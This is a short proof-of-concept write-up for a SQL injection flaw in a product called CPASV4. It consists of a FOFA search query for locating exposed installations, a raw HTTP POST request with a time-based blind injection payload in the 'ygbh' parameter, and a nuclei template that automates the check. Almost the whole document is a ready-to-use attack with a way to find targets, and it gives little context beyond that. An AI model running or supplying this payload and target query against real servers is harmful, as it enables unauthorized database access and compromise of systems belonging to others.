# fofa

```plain
body="/cpasm4/static/cap/font/iconfont.css"
```

# POC

```http
POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/plain, */*; q=0.01

ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(5)))mlQT) AND 'qoYJ'='qoYJ
```

# nuclei

```yaml
id: CPASV4-getCurserIfAllowLogin-sqli

info:
  name: CPASV4 getCurserIfAllowLogin SQL injection
  author: zxf
  severity: high
  metadata:
    fofasearch: body="/cpasm4/static/cap/font/iconfont.css"

http:
  - raw:
      - |
        POST /cpasm4/cpasList/getCurserIfAllowLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept: text/plain, */*; q=0.01

        ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(5)))mlQT) AND 'qoYJ'='qoYJ
        
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && duration >= 5
```

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739185233706-cc274212-34f3-488f-8cc4-08597a5f3c1d.png)

![img](https://cdn.nlark.com/yuque/0/2025/png/40959960/1739185476522-998c4931-c0b4-452d-bd66-5aa7e2a228dd.png)